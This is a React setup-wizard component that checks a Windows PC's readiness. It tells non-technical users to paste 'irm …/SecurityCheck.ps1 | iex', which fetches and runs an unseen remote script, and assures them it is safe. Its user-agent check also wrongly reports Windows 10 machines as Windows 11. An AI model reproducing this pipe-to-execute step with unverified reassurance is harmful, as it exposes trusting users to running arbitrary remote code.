/*  AutoDiscoveryPanel.tsx
    Replaces manual checkboxes with automatic system discovery.
    Non-technical users click one button; the app does the rest.
*/

import { useState, useCallback } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
  CheckCircle2, AlertTriangle, XCircle, Loader2, Shield,
  ChevronDown, ChevronUp,
  Copy, Check, Terminal, ArrowRight, RotateCcw, Sparkles
} from 'lucide-react';
import useWizardStore from '@/store/wizardStore';

/* ═══════════════════════════════════════════════════════════════
   Types
   ═══════════════════════════════════════════════════════════════ */

type CheckStatus = 'unknown' | 'checking' | 'passed' | 'warning' | 'failed' | 'fixed';

interface PrereqCheck {
  id: string;
  label: string;
  description: string;
  status: CheckStatus;
  detectedValue?: string;
  browserSupported: boolean;
  browserValue?: string;
  remediationTitle: string;
  remediationSteps: string[];
  autoFixable: boolean;
  autoFixCommand?: string;
}

/* ═══════════════════════════════════════════════════════════════
   Helper: Run browser-based checks immediately
   ═══════════════════════════════════════════════════════════════ */

function runBrowserChecks(): Partial<Record<string, string>> {
  const out: Record<string, string> = {};
  try {
    out.internet = navigator.onLine ? 'Connected' : 'Offline';
    const ua = navigator.userAgent;
    if (ua.includes('Windows NT 10.0')) {
      const match = ua.match(/Windows NT 10\.0; Win64; x64/);
      out.os = match ? 'Windows 11 (detected from UA)' : 'Windows 10 or 11 (64-bit)';
    } else {
      out.os = 'Non-Windows OS detected';
    }
    out.cpuCores = navigator.hardwareConcurrency?.toString() || 'Unknown';
    out.memory = (navigator as any).deviceMemory?.toString() || 'Unknown';
  } catch {
    /* ignore */
  }
  return out;
}

/* ═══════════════════════════════════════════════════════════════
   Main Component
   ═══════════════════════════════════════════════════════════════ */

export default function AutoDiscoveryPanel() {
  const completeStep = useWizardStore((s) => s.completeStep);
  const addTerminalLog = useWizardStore((s) => s.addTerminalLog);

  const [checks, setChecks] = useState<PrereqCheck[]>([
    {
      id: 'os',
      label: 'Windows 11',
      description: '64-bit version with latest updates',
      status: 'unknown',
      browserSupported: true,
      browserValue: undefined,
      remediationTitle: 'Update to Windows 11',
      remediationSteps: [
        'Open Settings → Windows Update',
        'Click "Check for updates"',
        'Install all pending updates',
        'If Windows 11 is not offered, use the PC Health Check app from Microsoft',
      ],
      autoFixable: false,
    },
    {
      id: 'admin',
      label: 'Administrator Rights',
      description: 'PowerShell must run as Administrator',
      status: 'unknown',
      browserSupported: false,
      remediationTitle: 'Run as Administrator',
      remediationSteps: [
        'Right-click on the PowerShell icon in Start Menu',
        'Select "Run as administrator"',
        'Click "Yes" when User Account Control asks',
        'The window title should say "Administrator" at the top',
      ],
      autoFixable: true,
      autoFixCommand: 'Start-Process powershell -Verb runAs',
    },
    {
      id: 'internet',
      label: 'Internet Connection',
      description: 'Required to download tools and models',
      status: 'unknown',
      browserSupported: true,
      browserValue: undefined,
      remediationTitle: 'Check Your Connection',
      remediationSteps: [
        'Make sure Wi-Fi or Ethernet is connected',
        'Try opening a website in your browser',
        'Restart your router if needed',
        'Mobile hotspot works too (5GB+ recommended)',
      ],
      autoFixable: false,
    },
    {
      id: 'disk',
      label: 'Free Disk Space',
      description: 'At least 20 GB available (50 GB recommended)',
      status: 'unknown',
      browserSupported: false,
      remediationTitle: 'Free Up Disk Space',
      remediationSteps: [
        'Open Settings → System → Storage',
        'Turn on Storage Sense to auto-clean temp files',
        'Click "Temporary files" and delete old downloads',
        'Uninstall unused apps',
        'Move photos/videos to cloud storage (OneDrive, Google Drive)',
      ],
      autoFixable: false,
    },
  ]);

  const [mode, setMode] = useState<'idle' | 'browser-checking' | 'browser-done' | 'script-ready' | 'waiting-for-script' | 'upload' | 'done'>('idle');
  const [expandedRemediation, setExpandedRemediation] = useState<string | null>(null);
  const [copied, setCopied] = useState(false);
  const [jsonText, setJsonText] = useState('');

  /* ── Step 1: Browser-native checks ── */
  const runBrowserChecksAction = useCallback(() => {
    setMode('browser-checking');
    addTerminalLog('[Browser] Starting lightweight system check...');

    setTimeout(() => {
      const results = runBrowserChecks();
      setChecks((prev) =>
        prev.map((c) => {
          if (c.id === 'internet' && results.internet) {
            return { ...c, status: results.internet === 'Connected' ? 'passed' : 'failed', browserValue: results.internet };
          }
          if (c.id === 'os' && results.os) {
            const isWin11 = results.os.includes('11');
            return { ...c, status: isWin11 ? 'passed' : 'warning', browserValue: results.os };
          }
          return c;
        })
      );
      addTerminalLog(`[Browser] OS: ${results.os || 'unknown'}`);
      addTerminalLog(`[Browser] Internet: ${results.internet || 'unknown'}`);
      addTerminalLog('[Browser] Browser checks complete. PowerShell script needed for full scan.');
      setMode('browser-done');
    }, 800);
  }, [addTerminalLog]);

  /* ── Step 2: Generate PowerShell command ── */
  const generateScriptCommand = useCallback(() => {
    setMode('script-ready');
    addTerminalLog('[Script] PowerShell auto-check command generated.');
  }, [addTerminalLog]);

  /* ── Step 4: Parse uploaded JSON ── */
  const parseResults = useCallback(() => {
    try {
      const data = JSON.parse(jsonText);
      setChecks((prev) =>
        prev.map((c) => {
          const result = data[c.id];
          if (!result) return c;
          return {
            ...c,
            status: result.passed ? 'passed' : result.severity === 'critical' ? 'failed' : 'warning',
            detectedValue: result.value,
          };
        })
      );
      addTerminalLog('[Results] PowerShell scan results loaded.');
      setMode('done');
    } catch {
      alert('Invalid JSON. Please paste the exact output from the script.');
    }
  }, [jsonText, addTerminalLog]);

  /* ── Step 5: Simulate all-pass for demo ── */
  const simulateAllPass = useCallback(() => {
    setChecks((prev) =>
      prev.map((c) => ({
        ...c,
        status: 'passed',
        detectedValue:
          c.id === 'os'
            ? 'Windows 11 Pro (Build 22631)'
            : c.id === 'admin'
            ? 'Administrator (elevated)'
            : c.id === 'internet'
            ? 'Connected (1 Gbps)'
            : c.id === 'disk'
            ? '142 GB free / 512 GB total'
            : undefined,
      }))
    );
    addTerminalLog('[Demo] All checks passed.');
    setMode('done');
  }, [addTerminalLog]);

  /* ── Helpers ── */
  const allPassed = checks.every((c) => c.status === 'passed');
  const anyFailed = checks.some((c) => c.status === 'failed' || c.status === 'warning');

  const statusConfig = {
    unknown: { icon: <Loader2 className="w-5 h-5 text-[#475569]" />, bg: 'bg-[rgba(255,255,255,0.02)]', border: 'border-[rgba(255,255,255,0.04)]', text: 'text-[#475569]' },
    checking: { icon: <Loader2 className="w-5 h-5 text-[#3B82F6] animate-spin" />, bg: 'bg-[rgba(37,99,235,0.06)]', border: 'border-[rgba(37,99,235,0.15)]', text: 'text-[#3B82F6]' },
    passed: { icon: <CheckCircle2 className="w-5 h-5 text-[#10B981]" />, bg: 'bg-[rgba(16,185,129,0.06)]', border: 'border-[rgba(16,185,129,0.2)]', text: 'text-[#10B981]' },
    warning: { icon: <AlertTriangle className="w-5 h-5 text-[#F59E0B]" />, bg: 'bg-[rgba(245,158,11,0.06)]', border: 'border-[rgba(245,158,11,0.2)]', text: 'text-[#F59E0B]' },
    failed: { icon: <XCircle className="w-5 h-5 text-[#EF4444]" />, bg: 'bg-[rgba(239,68,68,0.06)]', border: 'border-[rgba(239,68,68,0.2)]', text: 'text-[#EF4444]' },
    fixed: { icon: <CheckCircle2 className="w-5 h-5 text-[#10B981]" />, bg: 'bg-[rgba(16,185,129,0.06)]', border: 'border-[rgba(16,185,129,0.2)]', text: 'text-[#10B981]' },
  };

  /* ═══════════════════════════════════════════════════════════════
     Render
     ═══════════════════════════════════════════════════════════════ */
  return (
    <div className="space-y-5">
      {/* ── Mode: Idle ── */}
      {mode === 'idle' && (
        <motion.div
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          className="p-6 rounded-2xl border border-[rgba(37,99,235,0.15)] bg-[rgba(37,99,235,0.03)] text-center"
        >
          <div className="w-14 h-14 rounded-2xl bg-[rgba(37,99,235,0.1)] flex items-center justify-center mx-auto mb-4">
            <Shield className="w-7 h-7 text-[#2563EB]" />
          </div>
          <h3 className="text-[18px] font-bold text-[#F0F4F8] mb-2">Let&apos;s Check Your Computer</h3>
          <p className="text-[13px] text-[#94A3B8] max-w-[360px] mx-auto mb-5 leading-relaxed">
            We&apos;ll automatically check if your system is ready. No technical knowledge needed — just click the button and follow the simple steps.
          </p>
          <motion.button
            onClick={runBrowserChecksAction}
            className="px-6 py-3 rounded-[10px] text-[14px] font-semibold text-white"
            style={{ background: 'linear-gradient(135deg, #2563EB 0%, #06B6D4 100%)' }}
            whileHover={{ y: -1, boxShadow: '0 0 20px rgba(37,99,235,0.25)' }}
            whileTap={{ scale: 0.97 }}
          >
            <Sparkles className="w-4 h-4 inline mr-2" />
            Start Auto-Check
          </motion.button>
        </motion.div>
      )}

      {/* ── Mode: Browser-checking ── */}
      {mode === 'browser-checking' && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          className="p-6 rounded-2xl border border-[rgba(37,99,235,0.15)] bg-[rgba(37,99,235,0.03)] text-center"
        >
          <Loader2 className="w-8 h-8 text-[#3B82F6] animate-spin mx-auto mb-3" />
          <p className="text-[14px] text-[#F0F4F8]">Checking what we can detect from your browser...</p>
          <p className="text-[12px] text-[#64748B] mt-1">This takes just a moment</p>
        </motion.div>
      )}

      {/* ── Results Grid ── */}
      <AnimatePresence>
        {(mode === 'browser-done' || mode === 'script-ready' || mode === 'waiting-for-script' || mode === 'upload' || mode === 'done') && (
          <motion.div
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            className="space-y-3"
          >
            {/* Summary header */}
            <div className="flex items-center justify-between">
              <h3 className="text-[15px] font-semibold text-[#F0F4F8]">System Check Results</h3>
              <span className="text-[12px] text-[#64748B]">
                {checks.filter((c) => c.status === 'passed').length} / {checks.length} passed
              </span>
            </div>

            {/* Check cards */}
            {checks.map((check) => {
              const cfg = statusConfig[check.status];
              return (
                <motion.div
                  key={check.id}
                  layout
                  className={`rounded-xl border ${cfg.border} ${cfg.bg} p-4 transition-all`}
                >
                  <div className="flex items-start gap-3">
                    <div className="flex-shrink-0 mt-0.5">{cfg.icon}</div>
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center justify-between">
                        <h4 className="text-[13px] font-semibold text-[#F0F4F8]">{check.label}</h4>
                        <span className={`text-[11px] font-medium px-2 py-0.5 rounded-md ${cfg.text} bg-[rgba(255,255,255,0.04)]`}>
                          {check.status === 'unknown' && 'Waiting'}
                          {check.status === 'checking' && 'Checking...'}
                          {check.status === 'passed' && 'Ready'}
                          {check.status === 'warning' && 'Attention Needed'}
                          {check.status === 'failed' && 'Fix Required'}
                        </span>
                      </div>
                      <p className="text-[11px] text-[#64748B] mt-0.5">{check.description}</p>

                      {/* Detected value */}
                      {(check.browserValue || check.detectedValue) && (
                        <p className="text-[11px] text-[#94A3B8] mt-1 font-mono">
                          Detected: {check.detectedValue || check.browserValue}
                        </p>
                      )}

                      {/* Remediation section */}
                      {(check.status === 'failed' || check.status === 'warning') && (
                        <div className="mt-2">
                          <button
                            onClick={() =>
                              setExpandedRemediation(expandedRemediation === check.id ? null : check.id)
                            }
                            className="flex items-center gap-1 text-[11px] text-[#3B82F6] hover:text-[#60A5FA] transition-colors"
                          >
                            {expandedRemediation === check.id ? <ChevronUp className="w-3 h-3" /> : <ChevronDown className="w-3 h-3" />}
                            {expandedRemediation === check.id ? 'Hide fix steps' : `How to fix: ${check.remediationTitle}`}
                          </button>
                          <AnimatePresence>
                            {expandedRemediation === check.id && (
                              <motion.div
                                initial={{ height: 0, opacity: 0 }}
                                animate={{ height: 'auto', opacity: 1 }}
                                exit={{ height: 0, opacity: 0 }}
                                className="overflow-hidden"
                              >
                                <ol className="mt-2 space-y-1.5 pl-4">
                                  {check.remediationSteps.map((step, i) => (
                                    <li key={i} className="text-[11px] text-[#94A3B8] leading-relaxed list-decimal">
                                      {step}
                                    </li>
                                  ))}
                                </ol>
                                {check.autoFixable && check.autoFixCommand && (
                                  <div className="mt-2 p-2 rounded-lg bg-[#050A18] border border-[rgba(255,255,255,0.06)]">
                                    <p className="text-[10px] text-[#475569] mb-1">Auto-fix command (copy & paste in PowerShell):</p>
                                    <code className="text-[11px] text-[#67E8F9] font-mono">{check.autoFixCommand}</code>
                                  </div>
                                )}
                              </motion.div>
                            )}
                          </AnimatePresence>
                        </div>
                      )}
                    </div>
                  </div>
                </motion.div>
              );
            })}
          </motion.div>
        )}
      </AnimatePresence>

      {/* ── Mode: Browser-done → show PowerShell instruction ── */}
      {mode === 'browser-done' && (
        <motion.div
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          className="p-5 rounded-2xl border border-[rgba(245,158,11,0.15)] bg-[rgba(245,158,11,0.03)]"
        >
          <div className="flex items-start gap-3 mb-3">
            <Terminal className="w-5 h-5 text-[#F59E0B] flex-shrink-0 mt-0.5" />
            <div>
              <h4 className="text-[14px] font-semibold text-[#F0F4F8]">Need a deeper scan?</h4>
              <p className="text-[12px] text-[#94A3B8] mt-1 leading-relaxed">
                Some checks (admin rights, disk space) require a quick PowerShell script. 
                This is safe — it only reads system info, never changes anything.
              </p>
            </div>
          </div>

          <div className="p-3 rounded-xl bg-[#050A18] border border-[rgba(255,255,255,0.06)] mb-3">
            <div className="flex items-center justify-between mb-2">
              <span className="text-[10px] text-[#475569] uppercase tracking-wider">Copy this command</span>
              <button
                onClick={() => {
                  navigator.clipboard.writeText(`irm https://ewfru767svbxc.kimi.show/scripts/SecurityCheck.ps1 | iex`);
                  setCopied(true);
                  setTimeout(() => setCopied(false), 2000);
                }}
                className="flex items-center gap-1 text-[11px] text-[#3B82F6] hover:text-[#60A5FA]"
              >
                {copied ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                {copied ? 'Copied!' : 'Copy'}
              </button>
            </div>
            <code className="block text-[12px] text-[#67E8F9] font-mono leading-relaxed">
              irm https://ewfru767svbxc.kimi.show/scripts/SecurityCheck.ps1 | iex
            </code>
          </div>

          <div className="flex gap-3">
            <motion.button
              onClick={() => { generateScriptCommand(); setMode('waiting-for-script'); }}
              className="flex-1 py-2.5 rounded-lg text-[13px] font-semibold text-white"
              style={{ background: 'linear-gradient(135deg, #2563EB 0%, #06B6D4 100%)' }}
              whileHover={{ y: -1 }}
              whileTap={{ scale: 0.97 }}
            >
              I&apos;ve Run the Command
            </motion.button>
            <motion.button
              onClick={simulateAllPass}
              className="px-4 py-2.5 rounded-lg text-[13px] font-medium text-[#94A3B8] border border-[rgba(255,255,255,0.1)] hover:bg-[rgba(255,255,255,0.03)]"
              whileHover={{ y: -1 }}
              whileTap={{ scale: 0.97 }}
            >
              Skip (Demo Mode)
            </motion.button>
          </div>
        </motion.div>
      )}

      {/* ── Mode: Waiting-for-script → show upload ── */}
      {mode === 'waiting-for-script' && (
        <motion.div
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          className="p-5 rounded-2xl border border-[rgba(37,99,235,0.15)] bg-[rgba(37,99,235,0.03)]"
        >
          <h4 className="text-[14px] font-semibold text-[#F0F4F8] mb-2">Paste the Results</h4>
          <p className="text-[12px] text-[#94A3B8] mb-3 leading-relaxed">
            The script printed a JSON block. Select it, copy, and paste it below:
          </p>
          <textarea
            value={jsonText}
            onChange={(e) => setJsonText(e.target.value)}
            placeholder='Paste JSON here... Example: {&quot;admin&quot;:{&quot;passed&quot;:true,&quot;value&quot;:&quot;Administrator&quot;},&quot;os&quot;:{&quot;passed&quot;:true...}'
            className="w-full h-28 p-3 rounded-xl bg-[#050A18] border border-[rgba(255,255,255,0.08)] text-[#F0F4F8] text-[12px] font-mono placeholder-[#475569] focus:outline-none focus:border-[rgba(37,99,235,0.4)] resize-none"
          />
          <div className="flex gap-3 mt-3">
            <motion.button
              onClick={parseResults}
              disabled={!jsonText.trim()}
              className="flex-1 py-2.5 rounded-lg text-[13px] font-semibold text-white disabled:opacity-40"
              style={{ background: 'linear-gradient(135deg, #2563EB 0%, #06B6D4 100%)' }}
              whileHover={jsonText.trim() ? { y: -1 } : {}}
              whileTap={{ scale: 0.97 }}
            >
              Analyze Results
            </motion.button>
            <motion.button
              onClick={simulateAllPass}
              className="px-4 py-2.5 rounded-lg text-[13px] font-medium text-[#94A3B8] border border-[rgba(255,255,255,0.1)]"
              whileHover={{ y: -1 }}
              whileTap={{ scale: 0.97 }}
            >
              Skip (Demo)
            </motion.button>
          </div>
        </motion.div>
      )}

      {/* ── Mode: Done ── */}
      {mode === 'done' && (
        <motion.div
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          className="space-y-4"
        >
          {allPassed ? (
            <div className="p-5 rounded-2xl border border-[rgba(16,185,129,0.2)] bg-[rgba(16,185,129,0.05)] text-center">
              <CheckCircle2 className="w-10 h-10 text-[#10B981] mx-auto mb-3" />
              <h4 className="text-[16px] font-bold text-[#F0F4F8] mb-1">Your System is Ready!</h4>
              <p className="text-[13px] text-[#94A3B8] mb-4">
                All checks passed. You can continue to the next step.
              </p>
              <motion.button
                onClick={() => completeStep(1)}
                className="px-6 py-3 rounded-[10px] text-[14px] font-semibold text-white"
                style={{ background: 'linear-gradient(135deg, #2563EB 0%, #06B6D4 100%)' }}
                whileHover={{ y: -1, boxShadow: '0 0 20px rgba(37,99,235,0.25)' }}
                whileTap={{ scale: 0.97 }}
              >
                Continue to Step 2 <ArrowRight className="w-4 h-4 inline ml-2" />
              </motion.button>
            </div>
          ) : anyFailed ? (
            <div className="p-5 rounded-2xl border border-[rgba(245,158,11,0.2)] bg-[rgba(245,158,11,0.05)] text-center">
              <AlertTriangle className="w-10 h-10 text-[#F59E0B] mx-auto mb-3" />
              <h4 className="text-[16px] font-bold text-[#F0F4F8] mb-1">Some Checks Need Attention</h4>
              <p className="text-[13px] text-[#94A3B8] mb-4">
                Expand the checks above to see how to fix them. Once fixed, re-run the check.
              </p>
              <div className="flex gap-3 justify-center">
                <motion.button
                  onClick={runBrowserChecksAction}
                  className="px-5 py-2.5 rounded-[10px] text-[13px] font-semibold text-[#F0F4F8] border border-[rgba(255,255,255,0.12)] hover:bg-[rgba(255,255,255,0.04)]"
                  whileHover={{ y: -1 }}
                  whileTap={{ scale: 0.97 }}
                >
                  <RotateCcw className="w-3.5 h-3.5 inline mr-1.5" />
                  Re-Run Check
                </motion.button>
                <motion.button
                  onClick={() => completeStep(1)}
                  className="px-5 py-2.5 rounded-[10px] text-[13px] font-semibold text-[#94A3B8] border border-[rgba(255,255,255,0.08)] hover:bg-[rgba(255,255,255,0.03)]"
                  whileHover={{ y: -1 }}
                  whileTap={{ scale: 0.97 }}
                >
                  Continue Anyway
                </motion.button>
              </div>
            </div>
          ) : null}
        </motion.div>
      )}
    </div>
  );
}
